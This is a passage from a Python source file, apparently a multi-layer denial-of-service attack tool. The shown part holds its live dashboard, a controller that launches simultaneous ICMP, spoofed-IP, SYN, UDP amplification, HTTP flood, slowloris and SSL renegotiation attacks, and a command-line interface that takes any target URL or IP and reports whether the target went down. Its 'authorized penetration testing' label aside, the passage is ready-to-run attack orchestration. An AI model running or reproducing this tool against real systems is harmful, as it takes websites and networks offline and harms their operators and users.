        if not status["is_alive"]:
            event_color = Colors.BRIGHT_RED
            event_text = f"🚨 TARGET IS DOWN! Downtime: {format_time(downtime)}"
        elif status["response_time"] > 3:
            event_color = Colors.YELLOW
            event_text = f"⚠ High response time: {status['response_time']*1000:.0f}ms"
        elif rate > 0:
            event_color = Colors.BRIGHT_GREEN
            event_text = f"✓ Flooding at {format_rate(rate)} pkt/s"
        else:
            event_color = Colors.DIM
            event_text = "○ Initializing..."

        print(f"{Colors.CYAN}│{Colors.RESET}  {event_color}{event_text}{Colors.RESET}")
        print(f"{Colors.CYAN}└{'─' * 62}{Colors.RESET}")
        print()

        print(f"{Colors.DIM}{Colors.BRIGHT_BLACK}  Press Ctrl+C to stop  |  Status check every 2s{Colors.RESET}")

        sys.stdout.flush()

    print(f"\n{Colors.BG_BRIGHT_GREEN}{Colors.BRIGHT_WHITE}{Colors.BOLD}"
          f"  ✅ ATTACK COMPLETE  "
          f"{Colors.RESET}\n")


# ============================================================
# MASTER CONTROLLER
# ============================================================

def multi_layer_assault(target, duration=60, threads=500):
    scheme, host, port, path = parse_target(target)
    target_ip = resolve_target(host)
    layer_threads = max(threads // 10, 20)
    layer_duration = duration + 2

    attacks = []

    # Layer 3
    attacks.append(threading.Thread(target=icmp_flood, args=(target_ip, layer_duration, max(layer_threads//2, 10)), daemon=True))
    attacks.append(threading.Thread(target=ip_spoofed_flood, args=(target_ip, layer_duration, max(layer_threads//2, 10)), daemon=True))
    attacks.append(threading.Thread(target=ip_fragmentation_flood, args=(target_ip, layer_duration, max(layer_threads//3, 5)), daemon=True))

    # Layer 4
    attacks.append(threading.Thread(target=syn_flood, args=(target_ip, port, layer_duration, layer_threads), daemon=True))
    attacks.append(threading.Thread(target=syn_ack_flood, args=(target_ip, port, layer_duration, max(layer_threads//2, 10)), daemon=True))
    attacks.append(threading.Thread(target=ack_flood, args=(target_ip, port, layer_duration, max(layer_threads//2, 10)), daemon=True))
    attacks.append(threading.Thread(target=udp_flood, args=(target_ip, port, layer_duration, layer_threads), daemon=True))
    attacks.append(threading.Thread(target=udp_amplification, args=(target_ip, port, layer_duration, max(layer_threads//3, 5)), daemon=True))

    # Layer 7
    attacks.append(threading.Thread(target=http_flood, args=(target, layer_duration, layer_threads), daemon=True))
    attacks.append(threading.Thread(target=slowloris, args=(target, layer_duration, max(layer_threads, 100)), daemon=True))
    attacks.append(threading.Thread(target=slow_post, args=(target, layer_duration, max(layer_threads//2, 20)), daemon=True))

    for a in attacks:
        a.start()

    status_thread = threading.Thread(target=status_monitor, args=(target, 2), daemon=True)
    status_thread.start()

    draw_dashboard(target, duration, "Multi-Layer Assault")

    STOP_EVENT.set()
    print(f"\n{Colors.BRIGHT_GREEN}{Colors.BOLD}[+] Multi-layer assault complete.{Colors.RESET}")


# ============================================================
# CLI & MAIN
# ============================================================

LAYER_ATTACKS = {
    "icmp_flood": {"func": icmp_flood, "layer": 3, "desc": "ICMP echo request flood"},
    "ip_frag": {"func": ip_fragmentation_flood, "layer": 3, "desc": "IP fragmentation flood"},
    "ip_spoof": {"func": ip_spoofed_flood, "layer": 3, "desc": "Spoofed IP packet flood"},
    "syn_flood": {"func": syn_flood, "layer": 4, "desc": "TCP SYN flood"},
    "syn_ack": {"func": syn_ack_flood, "layer": 4, "desc": "TCP SYN-ACK flood"},
    "ack_flood": {"func": ack_flood, "layer": 4, "desc": "TCP ACK flood"},
    "udp_flood": {"func": udp_flood, "layer": 4, "desc": "UDP flood"},
    "udp_amp": {"func": udp_amplification, "layer": 4, "desc": "UDP amplification simulation"},
    "http_flood": {"func": http_flood, "layer": 7, "desc": "HTTP GET/POST flood"},
    "slowloris": {"func": slowloris, "layer": 7, "desc": "Slowloris - partial headers"},
    "slow_post": {"func": slow_post, "layer": 7, "desc": "Slow POST body trickle"},
    "ssl_reneg": {"func": ssl_renegotiation_flood, "layer": 7, "desc": "SSL renegotiation flood"},
}


def list_attacks():
    print(f"\n{Colors.BOLD}{Colors.BRIGHT_CYAN}═" * 60)
    print(f"{Colors.BOLD}{Colors.BRIGHT_WHITE}  AVAILABLE ATTACK MODULES")
    print(f"{Colors.BOLD}{Colors.BRIGHT_CYAN}═" * 60)
    for layer in [3, 4, 7]:
        layer_name = {3: "NETWORK", 4: "TRANSPORT", 7: "APPLICATION"}
        layer_color = {3: Colors.BRIGHT_YELLOW, 4: Colors.BRIGHT_MAGENTA, 7: Colors.BRIGHT_GREEN}
        print(f"\n{layer_color[layer]}{Colors.BOLD}─── Layer {layer} ({layer_name[layer]}) ───{Colors.RESET}")
        for name, info in LAYER_ATTACKS.items():
            if info["layer"] == layer:
                print(f"  {Colors.BRIGHT_CYAN}{name:20s}{Colors.RESET} - {Colors.DIM}{info['desc']}{Colors.RESET}")

    print(f"\n{Colors.BOLD}{Colors.BRIGHT_CYAN}═" * 60)
    print(f"{Colors.BOLD}{Colors.BRIGHT_YELLOW}  SPECIAL:{Colors.RESET}")
    print(f"  {Colors.BRIGHT_MAGENTA}layer3{Colors.RESET}        - {Colors.DIM}Run all Layer 3 attacks simultaneously{Colors.RESET}")
    print(f"  {Colors.BRIGHT_MAGENTA}layer4{Colors.RESET}        - {Colors.DIM}Run all Layer 4 attacks simultaneously{Colors.RESET}")
    print(f"  {Colors.BRIGHT_MAGENTA}layer7{Colors.RESET}        - {Colors.DIM}Run all Layer 7 attacks simultaneously{Colors.RESET}")
    print(f"  {Colors.BRIGHT_MAGENTA}all{Colors.RESET}           - {Colors.DIM}Run all attacks sequentially{Colors.RESET}")
    print(f"  {Colors.BRIGHT_MAGENTA}full{Colors.RESET}          - {Colors.DIM}Full multi-layer assault (all layers at once){Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.BRIGHT_CYAN}═" * 60)
    print()


def main():
    parser = argparse.ArgumentParser(
        description=f"{Colors.BOLD}Multi-Layer DDoS Simulation Suite{Colors.RESET} - For Authorized Penetration Testing Only"
    )
    parser.add_argument("target", help="Target URL or IP (e.g., http://example.com/ or 192.168.1.1)")
    parser.add_argument("-a", "--attack", default="http_flood",
                        help="Attack type or 'all'/'layer3'/'layer4'/'layer7'/'full'")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Duration in seconds")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Concurrent threads")
    parser.add_argument("--port", type=int, default=80, help="Target port (for IP targets)")
    parser.add_argument("--list", action="store_true", help="List available attacks")

    args = parser.parse_args()

    if args.list:
        list_attacks()
        return

    # Parse target
    try:
        ipaddress.ip_address(args.target)
        target_url = f"http://{args.target}:{args.port}"
        host = args.target
        port = args.port
    except ValueError:
        target_url = args.target
        scheme, host, port, _ = parse_target(target_url)

    target_ip = resolve_target(host)

    STATS["start_time"] = time.time()
    STATS["sent"] = 0
    STATS["failed"] = 0
    STOP_EVENT.clear()

    status_thread = threading.Thread(target=status_monitor, args=(target_url if '://' in args.target else f"http://{args.target}:{args.port}", 2), daemon=True)
    status_thread.start()

    if args.attack == "full":
        multi_layer_assault(target_url, duration=args.duration, threads=args.threads)
        return

    elif args.attack == "layer3":
        attacks = [
            (icmp_flood, (target_ip,)),
            (ip_fragmentation_flood, (target_ip,)),
            (ip_spoofed_flood, (target_ip,)),
        ]
        for func, extra_args in attacks:
            t = threading.Thread(target=func, args=(*extra_args, args.duration, args.threads // 3), daemon=True)
            t.start()
        draw_dashboard(target_url, args.duration, "Layer 3 Assault")

    elif args.attack == "layer4":
        attacks = [
            (syn_flood, (target_ip, port)),
            (syn_ack_flood, (target_ip, port)),
            (ack_flood, (target_ip, port)),
            (udp_flood, (target_ip, port)),
            (udp_amplification, (target_ip, port)),
        ]
        for func, extra_args in attacks:
            t = threading.Thread(target=func, args=(*extra_args, args.duration, args.threads // 5), daemon=True)
            t.start()
        draw_dashboard(target_url, args.duration, "Layer 4 Assault")

    elif args.attack == "layer7":
        target = target_url if '://' in args.target else f"http://{args.target}:{args.port}"
        attacks = [
            (http_flood, (target,)),
            (slowloris, (target,)),
            (slow_post, (target,)),
            (ssl_renegotiation_flood, (target,)),
        ]
        for func, extra_args in attacks:
            t = threading.Thread(target=func, args=(*extra_args, args.duration, args.threads // 4), daemon=True)
            t.start()
        draw_dashboard(target, args.duration, "Layer 7 Assault")

    elif args.attack == "all":
        target = target_url if '://' in args.target else f"http://{args.target}:{args.port}"
        for name, info in LAYER_ATTACKS.items():
            print(f"\n{Colors.BRIGHT_YELLOW}{Colors.BOLD}[+] Running: {name} ({info['desc']}){Colors.RESET}")
            if info["layer"] == 3:
                t = threading.Thread(target=info["func"], args=(target_ip, args.duration, args.threads), daemon=True)
            elif info["layer"] == 4:
                t = threading.Thread(target=info["func"], args=(target_ip, port, args.duration, args.threads), daemon=True)
            else:
                t = threading.Thread(target=info["func"], args=(target, args.duration, args.threads), daemon=True)
            t.start()
            t.join()
    else:
        target = target_url if '://' in args.target else f"http://{args.target}:{args.port}"
        attack_info = LAYER_ATTACKS.get(args.attack)
        if not attack_info:
            print(f"{Colors.BRIGHT_RED}[-] Unknown attack: {args.attack}{Colors.RESET}")
            list_attacks()
            return

        func = attack_info["func"]
        t = threading.Thread(target=func, args=(
            target_ip if attack_info["layer"] in (3,) else
            (target_ip, port) if attack_info["layer"] == 4 else
            target,
            args.duration,
            args.threads
        ), daemon=True)
        t.start()
        draw_dashboard(target, args.duration, args.attack)

    STOP_EVENT.set()
    time.sleep(0.5)

    total = time.time() - STATS["start_time"]

    # Final summary
    print(f"\n{Colors.BG_BRIGHT_GREEN if TARGET_STATUS['is_alive'] else Colors.BG_BRIGHT_RED}"
          f"{Colors.BRIGHT_WHITE}{Colors.BOLD}"
          f"  {'✅ TARGET SURVIVED' if TARGET_STATUS['is_alive'] else '❌ TARGET WAS DOWN'}  "
          f"{Colors.RESET}\n")
    print(f"{Colors.BOLD}┌─ FINAL STATISTICS {'─' * 41}{Colors.RESET}")
    print(f"{Colors.WHITE}│  Duration:     {Colors.BRIGHT_WHITE}{total:.1f}s{Colors.RESET}")
    print(f"{Colors.WHITE}│  Total Sent:   {Colors.BRIGHT_GREEN}{format_number(STATS['sent'])}{Colors.RESET}")
    print(f"{Colors.WHITE}│  Total Failed: {Colors.BRIGHT_RED}{format_number(STATS['failed'])}{Colors.RESET}")
    print(f"{Colors.WHITE}│  Avg Rate:     {Colors.BRIGHT_YELLOW}{format_rate(STATS['sent']/total)} pkt/s{Colors.RESET}")
    print(f"{Colors.WHITE}│  Status:       {Colors.BRIGHT_GREEN if TARGET_STATUS['is_alive'] else Colors.BRIGHT_RED}"
          f"{'ALIVE' if TARGET_STATUS['is_alive'] else 'DOWN'}{Colors.RESET}")
    print(f"{Colors.WHITE}│  Downtime:     {Colors.BRIGHT_RED if TARGET_STATUS['total_downtime'] > 0 else Colors.GREEN}"
          f"{format_time(TARGET_STATUS['total_downtime'])}{Colors.RESET}")
    print(f"{Colors.BOLD}└{'─' * 62}{Colors.RESET}")
    print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        STOP_EVENT.set()
        print(f"\n\n{Colors.BRIGHT_YELLOW}[!] Interrupted by user. Cleaning up...{Colors.RESET}")
        time.sleep(0.5)
        total = time.time() - STATS["start_time"]
        print(f"{Colors.BRIGHT_CYAN}[+] Total time: {total:.1f}s | Sent: {format_number(STATS['sent'])} | Failed: {format_number(STATS['failed'])}{Colors.RESET}")
        sys.exit(0)